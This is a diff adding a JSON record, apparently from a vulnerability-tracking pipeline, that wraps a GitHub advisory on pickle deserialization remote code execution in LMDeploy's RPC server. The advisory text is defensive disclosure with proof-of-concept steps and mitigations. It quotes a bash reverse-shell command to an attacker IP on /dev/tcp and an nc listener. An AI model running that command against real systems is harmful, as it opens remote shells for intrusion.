@@ -1,0 +1,59 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/86754844?v=4\", \"events_url\": \"https://api.github.com/users/Chenpinji/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/Chenpinji/followers\", \"following_url\": \"https://api.github.com/users/Chenpinji/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/Chenpinji/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/Chenpinji\", \"id\": 86754844, \"login\": \"Chenpinji\", \"node_id\": \"MDQ6VXNlcjg2NzU0ODQ0\", \"organizations_url\": \"https://api.github.com/users/Chenpinji/orgs\", \"received_events_url\": \"https://api.github.com/users/Chenpinji/received_events\", \"repos_url\": \"https://api.github.com/users/Chenpinji/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/Chenpinji/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/Chenpinji/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/Chenpinji\", \"user_view_type\": \"public\"}}, {\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/18394470?v=4\", \"events_url\": \"https://api.github.com/users/bbabacan/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/bbabacan/followers\", \"following_url\": \"https://api.github.com/users/bbabacan/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/bbabacan/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/bbabacan\", \"id\": 18394470, \"login\": \"bbabacan\", \"node_id\": \"MDQ6VXNlcjE4Mzk0NDcw\", \"organizations_url\": \"https://api.github.com/users/bbabacan/orgs\", \"received_events_url\": \"https://api.github.com/users/bbabacan/received_events\", \"repos_url\": \"https://api.github.com/users/bbabacan/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/bbabacan/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/bbabacan/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/bbabacan\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2025-59953\", \"cvss\": {\"score\": 9.8, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 9.8, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-502\", \"name\": \"Deserialization of Untrusted Data\"}], \"description\": \"### Description\\n\\nThe LMdeploy implements an rpc server (AsyncRPCServer in zmq_rpc.py) for supporting the RPC communications. In its core functionality call_and_response(), I found it will directly use the pickles.loads() to deserialize the received messages without any sanitization, hence resulting in a remote code execution vulnerability by this RPC server.\\n\\n### Proof of Concept\\n\\n* Step1:\\nThe victim user starts a RPC server that connects to its network interface. We give our example code (server.py) in the attachment, you can reproduce directly with server.py.\\n\\n* Step2:\\nThe attacker can then send malicious pickle dump data to the remote RPC address for the attack. We give a example to show how can an attacker acquire a command shell:\\n<img width=\\\"832\\\" height=\\\"324\\\" alt=\\\"image\\\" src=\\\"https://github.com/user-attachments/assets/03b9654d-e25b-4e93-903a-2aae8b12e704\\\" />\\n\\nIn this example, attacker modifies AsyncRPCClient and send a request containing malicious pickle dump data to let the victim execute command “bash -c ‘bash -i >& /dev/tcp/202.112.47.27/4444 0>&1’”, where 202.112.47.27 is an attacker’s server. \\nTwo points require special attention:\\n1.The client code originally only connects to localhost over a socket, but an attacker can easily change localhost to another IP to perform remote exploitation, because the RPC server does not validate the connecting IP.\\n2.The RPC server’s port is randomized, but an attacker can still scan ports to find and exploit it; in our demo we explicitly set the target port.\\n\\n\\n* Step3:\\nAttacker can use nc tool (nc -l 4444) to create a reverse shell and wait for connection. Then, attacker runs the client to send the malicious request. Since the pickle deserialization vulnerability, the victim rpc server will execute the malicious command and consequently let attacker get the command shell of victim machine.\\n\\nWe also give a demo video in the attachment, along with modified zmq_rpc.py. When you reproduce this issue in the client side (as an attacker), you can first replace zmq_rpc.py in pip site-packages with provided zmq_rpc.py in the attachment and then run python poc.py {port}.\\n\\n\\n### Impact\\nRemote code execution in the victim's machine over network. Once the victim starts the RPC server, an attacker on the network can gain arbitrary code execution by scanning and finding the victim’s service.\\n\\n\\n\\n### Mitigation\\n(1)Sanitize data before pickle.loads it (e.g., rewrite Unpickler.find_class to set a whitelist), or use more secure deserialization methods such as safetensor or msgpack to replace the insecure pickle.loads.\\n(2)Enable authentication in RPC services to ensure that only authenticated and trusted users are permitted to join the same cluster.\\n[LMdeploy.zip](https://github.com/user-attachments/files/22589686/LMdeploy.zip)\\n\\n### Maintainer assessment\\n\\nThis advisory tracks remotely reachable arbitrary code execution caused by deserializing untrusted ZMQ RPC messages with `pickle.loads()`.\\n\\nThe vulnerable RPC implementation was introduced in LMDeploy 0.9.1. Before version 0.10.2, `AsyncRPCServer` bound to `tcp://*`, allowing a network peer that could reach the randomly selected RPC port to submit a malicious pickle payload.\\n\\nVersion 0.10.2 changed the RPC server binding to localhost, removing the remote network attack surface. The RPC protocol still uses pickle internally, so the loopback RPC endpoint must remain inaccessible to untrusted local processes.\\n\\nAdditional client-side `pickle.loads()` call sites identified in a duplicate report are part of the same trusted internal RPC protocol and have been retained here as supporting evidence.\", \"ghsa_id\": \"GHSA-5h8j-6crg-7rmw\", \"github_reviewed_at\": \"2026-09-16T15:34:27Z\", \"html_url\": \"https://github.com/advisories/GHSA-5h8j-6crg-7rmw\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-5h8j-6crg-7rmw\"}, {\"type\": \"CVE\", \"value\": \"CVE-2025-59953\"}], \"nvd_published_at\": null, \"published_at\": \"2026-09-16T15:34:27Z\", \"references\": [\"https://github.com/InternLM/lmdeploy/security/advisories/GHSA-5h8j-6crg-7rmw\", \"https://github.com/InternLM/lmdeploy/releases/tag/v0.10.2\", \"https://github.com/advisories/GHSA-5h8j-6crg-7rmw\"], \"repository_advisory_url\": \"https://api.github.com/repos/InternLM/lmdeploy/security-advisories/GHSA-5h8j-6crg-7rmw\", \"severity\": \"critical\", \"source_code_location\": \"https://github.com/InternLM/lmdeploy\", \"summary\": \"LMdeploy has Remote Code Execution by Pickle Deserialization via zmq_rpc.call_and_response() in InterLM/lmdeploy\", \"type\": \"reviewed\", \"updated_at\": \"2026-09-16T15:34:28Z\", \"url\": \"https://api.github.com/advisories/GHSA-5h8j-6crg-7rmw\", \"vulnerabilities\": [{\"first_patched_version\": \"0.10.2\", \"package\": {\"ecosystem\": \"pip\", \"name\": \"lmdeploy\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \">= 0.9.1, < 0.10.2\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-5h8j-6crg-7rmw",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_entries": {},
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "lmdeploy: >= 0.9.1, < 0.10.2"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2025-59953"
+    ],
+    "cvss_score": 9.8,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "lmdeploy"
+    ],
+    "remote": true,
+    "vendor_severity": "critical"
+  },
+  "first_seen_at": "2026-09-16T19:13:43.324366Z",
+  "provenance": {
+    "content_sha256": "4603a4c4707bfe9ef419fb6dd9c3f55f2fb3b67c2ca0c0f0d050114ec9f0ad1f",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-09-16T15:34:27Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-5h8j-6crg-7rmw",
+  "status": "active",
+  "title": "LMdeploy has Remote Code Execution by Pickle Deserialization via zmq_rpc.call_and_response() in InterLM/lmdeploy",
+  "updated_at": "2026-09-16T15:34:28Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-5h8j-6crg-7rmw"
+}
